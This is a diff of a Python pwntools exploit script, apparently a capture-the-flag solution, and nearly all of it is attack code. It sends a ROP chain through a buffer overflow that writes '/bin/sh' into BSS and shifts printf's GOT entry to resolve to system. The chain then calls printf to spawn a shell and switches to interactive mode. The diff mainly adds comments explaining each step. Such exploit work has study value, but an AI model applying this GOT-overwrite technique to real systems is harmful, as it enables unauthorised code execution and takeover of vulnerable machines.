@@ -11,7 +11,7 @@ GOT_PRINTF = elf.got['printf']
 VULN = elf.sym['vuln']
 
 PLT_PRINTF = elf.plt['printf']
-BSS = elf.bss() + 0x200
+BSS = elf.bss() + 0x200 #to avoid overwriting existing global variables
 
 
 print(f"[*] delta          = {hex(difference & 0xffffffffffffffff)}")
@@ -29,11 +29,12 @@ b'1' * OFFSET_TO_RIP,
     p64(elf.sym.pop_rsi_ret), p64(u64(b'/bin/sh\x00')),
     p64(elf.sym.add_what_where),
 
+    #add difference to got.printf, so that it now resolves to system instead
     p64(elf.sym.pop_rdi_ret), p64(GOT_PRINTF),
     p64(elf.sym.pop_rsi_ret), p64(difference & 0xffffffffffffffff),
     p64(elf.sym.add_what_where), 
     
-    # call printf(BSS) => system("/bin/sh")
+    # call printf(BSS), which is really system("/bin/sh")
     p64(elf.sym.pop_rdi_ret), p64(BSS),
     p64(elf.sym.ret_gadget),
     p64(PLT_PRINTF)
@@ -43,17 +44,5 @@ p.send(payload1)
 p.recvuntil(b'Click.\n')
 
 
-#payload2 = flat(
- #       b'1' * OFFSET_TO_RIP, 
-  #      p64(elf.sym.pop_rdi_ret), p64(BSS),
-   #     p64(elf.sym.pop_rsi_ret), p64(u64(b'/bin/sh\x00')),
-    #    p64(elf.sym.add_what_where),    # BSS += "/bin/sh" (BSS was 0)
-     #   p64(elf.sym.pop_rdi_ret), p64(BSS),
-      #  p64(elf.sym.ret_gadget),        # alignment
-       # p64(PLT_PRINTF)
 
-        #)
-
-#p.recvuntil(b'combination:')
-#p.send(payload2)
 p.interactive()
